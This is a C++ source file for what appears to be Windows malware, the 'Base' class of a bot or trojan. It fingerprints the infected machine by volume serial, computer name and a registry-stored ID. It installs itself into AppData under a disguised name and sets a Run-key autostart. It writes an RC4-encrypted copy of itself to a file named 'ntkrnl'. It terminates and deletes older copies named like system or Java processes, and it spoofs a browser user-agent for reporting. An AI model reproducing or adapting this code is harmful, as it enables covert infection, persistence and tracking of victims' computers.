#include "Base.h"
#include "Config.inc"
#include "MonitoringThread.h"
#include <time.h>

Base *Base::instance()
{
	static Base *i = NULL;
	if (!i)
		i = new Base();

	return(i);
}

void RC4Crypt(unsigned char *Buffer, int BufferLen, char *Key, int KeyLen)
{
    int i, x, y, a, b, j = 0, k = 0;
	unsigned char m[256];
    x = 0;
    y = 0;
	for (i = 0; i < 256; i++) m[i] = (unsigned char) i;
	for (i = 0; i < 256; i++)
    {
        a = m[i];
        j = (j + a + Key[k]) & 0xFF;
        m[i] = m[j];
        m[j] = (unsigned char) a;
		k = (k + 1) % KeyLen;
    }
	
	for (i = 0; i < BufferLen; i++)
    {
        x = (x + 1) & 0xFF;
		a = m[x];
        y = (y + a) & 0xFF;
		b = m[y];
        m[x] = (unsigned char) b;
        m[y] = (unsigned char) a;
		Buffer[i] = (unsigned char) (Buffer[i] ^ m[(unsigned char) (a + b)]);
    }
}

#define KEY "Password"

Base::Base(void)
{
	DWORD ser;
	char pcn[512],
		proc[MAX_PATH + 1],
		appdata[MAX_PATH + 1],
		s[32] = "";

	GetVolumeInformationA(NULL, NULL, 0, &ser, NULL, NULL, NULL, 0);
	sprintf(s, "%x", ser);
	
	DWORD sz = sizeof(pcn);
	if (!GetComputerName(pcn, &sz))
		strcpy(pcn, "errorretrieving");

	if (!GetModuleFileNameA(NULL, proc, sizeof(proc)))
		strcpy(proc, "err");

	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdata);

	version = (BYTE)1 << 8 | (BYTE)2;

	unsigned char sel = HIBYTE(HIWORD(ser)) + LOBYTE(HIWORD(ser)) + HIBYTE(LOWORD(ser)) + LOBYTE(LOWORD(ser));
	exename = names[sel % N_NAMES];
	inspath = appdata + std::string("\\") + DIRECTORY_NAME + std::string("\\") + exename;
	insdir = appdata + std::string("\\") + DIRECTORY_NAME + std::string("\\");
	
	ForceDirectories(insdir.c_str());
	
	ReadHardwareId(s, sizeof(s));
	
	char SourceFilePath[1024];
	SHGetSpecialFolderPath(0, SourceFilePath, CSIDL_APPDATA, 0);
	strcat(SourceFilePath, "\\ntkrnl");

	FILE *Source = fopen(proc, "rb");
	fseek(Source, 0, SEEK_END);
	int Len = ftell(Source);
	fseek(Source, 0, SEEK_SET);
	unsigned char *Data = (unsigned char *) malloc(Len);
	fread(Data, sizeof(char), Len, Source);
	fclose(Source);
	RC4Crypt((unsigned char *) Data, Len, KEY, strlen(KEY));
	
	FILE *Destination = fopen(SourceFilePath, "wb");	
	fwrite(Data, sizeof(char), Len, Destination);
	fclose(Destination);

	this->serial = ser;
	this->hwid = s;
	this->pcname = pcn;
	this->curpath = proc;
	this->adpath = appdata;
}


Base::~Base(void)
{

}

unsigned int Base::RandomRange(const int Min, const int Max)
{
	return (rand() % (Max - Min + 1) + Min);
}

void Base::GenerateRandomString(char Result[], int Len)
{
	int i;
	srand((unsigned int) time(NULL) ^ Len);
	for (i = 0; i < Len; i++)
	{
		if (RandomRange(1, 255) % 2) Result[i] = (char) RandomRange('A', 'Z');
		else Result[i] = (char) RandomRange('a', 'z');
	}
}

char *ReadRegistryValue(const HKEY hKey, const char *lpSubKey, const char *lpValueName)
{
	HKEY hResult;
	LPBYTE lpData = NULL;
	DWORD dwSize, dwType;
	if (RegOpenKeyEx(hKey, lpSubKey, 0, KEY_READ, &hResult) == ERROR_SUCCESS)
	{
		if (RegQueryValueEx(hResult, lpValueName, NULL, NULL, NULL, &dwSize) == ERROR_SUCCESS)
		{
			lpData = (BYTE *) malloc(dwSize);
			if (lpData)
			{
				if (RegQueryValueEx(hResult, lpValueName, NULL, &dwType, lpData, &dwSize) != ERROR_SUCCESS)
				 free(lpData);
			}
			RegCloseKey(hResult);
			return (char *) lpData;
		}
	}
	return NULL;
}

bool WriteRegistryValue(const HKEY hKey, const char *lpSubKey, const char *lpValueName, const char *lpValueData)
{
	bool Result = false;
	HKEY hResult;
	if (RegCreateKeyEx(hKey, lpSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hResult, NULL) == ERROR_SUCCESS)
	{
		Result = (RegSetValueEx(hResult, lpValueName, 0, REG_SZ, (const unsigned char *) lpValueData, strlen(lpValueData)) == ERROR_SUCCESS);
		RegCloseKey(hResult);
	}
	return Result;
}

void Base::ReadHardwareId(char Id[], size_t Size)
{
	HKEY hResult;
	memset(Id, '\0', Size);
	char *Result = ReadRegistryValue(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\", "identifier");
	if (Result == NULL)
	{
		GenerateRandomString(Id, 6);
		WriteRegistryValue(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\", "identifier", Id);
	}
	else
	{
		strncpy(Id, Result, Size);
		free(Result);
	}
}

bool Base::DirectoryExists(const char *DirectoryPath)
{
	DWORD Attr = GetFileAttributes(DirectoryPath);
	return ((Attr != 0xFFFFFFFF) && ((Attr & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY));
}

bool Base::ForceDirectories(const char *Path)
{
	char *pp, *sp, PathCopy[1024];
	if (strlen(Path) >= sizeof(PathCopy)) return false;
	strncpy(PathCopy, Path, sizeof(PathCopy));

	char Delimiter = '\\';

	bool Created = true;
	pp = PathCopy;
	while (Created && (sp = StrChar(pp, Delimiter)) != NULL)
	{
		if (sp != pp)
		{
			*sp = '\0';
			if (!DirectoryExists(PathCopy)) Created = CreateDirectory(PathCopy, NULL);
			*sp = Delimiter;
		}
		pp = sp + 1;
	}
	return Created;
}


void Base::getADPath(std::string &appdata)
{
	appdata = this->adpath;
}

void Base::getCurrentPath(std::string &path)
{
	path = this->curpath;
}

void Base::getPCName(std::string &pcname)
{
	pcname = this->pcname;
}

DWORD Base::getSerial()
{
	return(this->serial);
}

void Base::getHWID(std::string &hwid)
{
	hwid = this->hwid;
}

WORD Base::getNVersion()
{
	return version;
}

void Base::terminate()
{
	log(LL_DIAG, L_IAM L_TERMINATE);
	Updater::instance()->forceSubmit();
	exit(0);
}

void Base::getInstallPath(std::string &path)
{
	path = inspath;
}

bool Base::isInstalled()
{
	return(curpath == inspath);
}

void Base::getExeName(std::string &exename)
{
	exename = this->exename;
}

void Base::removeOld()
{
	static const char *old[] = {
		"dwm.exe",
		"win-firewall.exe",
		"adobeflash.exe",
		"desktop.exe",
		"jucheck.exe",
		"jusched.exe",
		"java.exe",
		NULL
	};

	std::string proc;
	getADPath(proc);
	proc += '\\';
	for (const char **o = old; *o; o++)
		forceDeleteFile(proc + *o);
}

void Base::remove()
{
	std::string proc;
	getADPath(proc);
	proc += '\\';

	for (unsigned int i = 0; i < N_NAMES; i++)
		forceDeleteFile(proc + names[i]);
}

bool Base::install()
{
	if (!CopyFile(curpath.c_str(), inspath.c_str(), false))
		return(false);

	if (!setAutostart())
		return(false);

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));
	si.cb = sizeof(si);
	if (!CreateProcess(inspath.c_str(), NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi))
		return(false);

	return(true);
}

void Base::forceInstall()
{
	log(LL_DIAG, L_FORCE L_DEL L_FILE "%s", inspath.c_str());
	forceDeleteFile(inspath);
}

bool Base::setAutostart()
{
	HKEY hKey;
	DWORD dwType = REG_SZ;

	if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0L,  KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS) {
		RegCloseKey(hKey);
		return(false);
	}

	if (RegSetValueEx(hKey, exename.substr(0, exename.length() - 4).c_str(), NULL, dwType, (LPBYTE)inspath.c_str(), inspath.length()) != ERROR_SUCCESS) {
		RegCloseKey(hKey);
		return false;
	}

	RegCloseKey(hKey);
	return(true);
}

bool Base::forceDeleteFile(std::string &file)
{
	HANDLE hFile = CreateFile(file.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == NULL || hFile == INVALID_HANDLE_VALUE)
		return(true);
	CloseHandle(hFile);
	if (!DeleteFile(file.c_str())) 
	{
		std::string exename = file;
		if (file.find_last_of('\\') != std::string::npos)
			exename = file.substr(file.find_last_of('\\') + 1);

		HANDLE hProc = findProc(0, exename.c_str());
		if (!hProc)
			return(false);
		TerminateProcess(hProc, 0);
		Sleep(1000);
	}

	if (!DeleteFile(file.c_str()))
		return(false);
	return(true);
}

HANDLE Base::findProc(DWORD pid, const char *exename)
{
	PROCESSENTRY32 pE;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);

	if (!hSnap || hSnap == INVALID_HANDLE_VALUE)
		return(NULL);

	memset(&pE, 0, sizeof(pE));
	pE.dwSize = sizeof(pE);

	if (!Process32First(hSnap, &pE)) {
		CloseHandle(hSnap);
		return(false);
	}

	DWORD mypid = GetCurrentProcessId();
	HANDLE ret = NULL;

	do {
		if (pE.th32ProcessID <= 4 || pE.th32ProcessID == mypid)
			continue;

		if (pid != 0 && pE.th32ProcessID != pid) 
			continue;

		if (exename && !strstr(pE.szExeFile, exename))
			continue;

		HANDLE hProc = OpenProcess(PROCESS_TERMINATE, false, pE.th32ProcessID);
		if (!hProc || hProc == INVALID_HANDLE_VALUE)
			continue;

		ret = hProc;
		break;

	} while (Process32Next(hSnap, &pE));
	CloseHandle(hSnap);

	return(ret);
}

void Base::getSVersion(std::string &version)
{
	version = std::string("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.") + (char)(HIBYTE(this->version) + '0') + std::string(".") + (char)(LOBYTE(this->version) + '0');
}

void Base::diag(const char *func, int line, DWORD error, LOGLEVEL level, const char *fmt, ...)
{
	char str[2048];
	char prefix[256];

	if (level != LL_ERROR) {
		Settings *s = Settings::instance();
		s->lock();
		bool cont = s->log;
		s->unlock();

		if (!cont)
			return;
	}

	va_list ap;
	va_start(ap, fmt);
	vsprintf_s(str, sizeof(str), fmt, ap);
	va_end(ap);

	sprintf(prefix, "[%s:%d <%x>] ", func, line, error);
	
	Updater::instance()->addDiag(std::string(prefix) + std::string(str));
}

bool Base::runProc(std::string &path)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));
	si.cb = sizeof(si);

	if (!CreateProcess(path.c_str(), NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi)) {
		log(LL_ERROR, L_EXECUTING "%s" L_FAIL, path.c_str());
		return(false);
	}

	return(true);
}